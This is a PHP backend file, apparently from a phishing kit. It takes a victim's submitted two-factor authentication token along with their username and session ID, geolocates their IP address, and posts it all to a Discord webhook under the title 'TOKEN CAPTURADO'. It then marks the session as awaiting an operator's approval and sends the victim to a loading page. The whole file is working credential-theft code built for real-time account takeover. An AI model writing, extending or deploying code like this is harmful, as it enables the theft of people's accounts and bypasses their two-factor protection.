<?php
// 2fa.php - Procesa el token 2FA
require 'config.php';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = trim($_POST['token'] ?? '');
    
    // Intentar recuperar usuario de la sesión PHP, o usar 'Desconocido'
    $usuario = $_SESSION['usuario'] ?? 'Desconocido';
    
    // Recuperar ID de sesión (debería venir en la URL o cookie, pero aquí asumimos flujo continuo)
    // Si el form envía el SID como hidden input sería ideal, pero usaremos la sesión PHP si existe
    $sessionId = $_SESSION['custom_sid'] ?? session_id();

    if (empty($token)) {
        header('Location: indexincorrecto.html');
        exit;
    }

    $ip = getUserIP();
    $geo = getGeoLocation($ip);
    $pais = $geo['country'] ?? 'Desconocido';
    $ciudad = $geo['city'] ?? 'Desconocida';

    // Enviar a Discord
    $embed = [
        "title" => "TOKEN CAPTURADO",
        "color" => 3066993, // Verde/Azul
        "fields" => [
            ["name" => "USUARIO", "value" => "```{$usuario}```", "inline" => true],
            ["name" => "TOKEN", "value" => "```{$token}```", "inline" => true],
            ["name" => "UBICACIÓN", "value" => "{$pais} - {$ciudad}", "inline" => false],
            ["name" => "SESSION ID", "value" => "```{$sessionId}```", "inline" => false]
        ],
        "footer" => ["text" => "PHP Backend - " . date("Y-m-d H:i:s")]
    ];

    sendToDiscord("@here **TOKEN 2FA RECIBIDO**", [$embed]);

    // Actualizar archivo de sesión para indicar que ya dio token (opcional)
    // Creamos un archivo específico para la fase de token si es necesario, 
    // o reutilizamos el mismo ID pero con sufijo '_token' para diferenciar en el panel admin si se desea.
    // Para simplificar, usaremos el mismo ID. El admin sabrá que está en fase 2 porque verá el aviso en Discord.
    
    // Actualizamos el estado en el archivo json si existe
    $file = DATA_DIR . "/{$sessionId}.json";
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        $data['status'] = 'waiting_token_approval';
        $data['command'] = null; // Limpiar comandos previos
        file_put_contents($file, json_encode($data));
    } else {
        // Si por alguna razón no existe (sesión expirada), lo creamos
        $data = [
            'id' => $sessionId,
            'status' => 'waiting_token_approval',
            'command' => null,
            'last_seen' => time()
        ];
        file_put_contents($file, json_encode($data));
    }

    // Redirigir a loading2
    header("Location: loading2.html?sid={$sessionId}");
    exit;
} else {
    header('Location: index.html');
    exit;
}
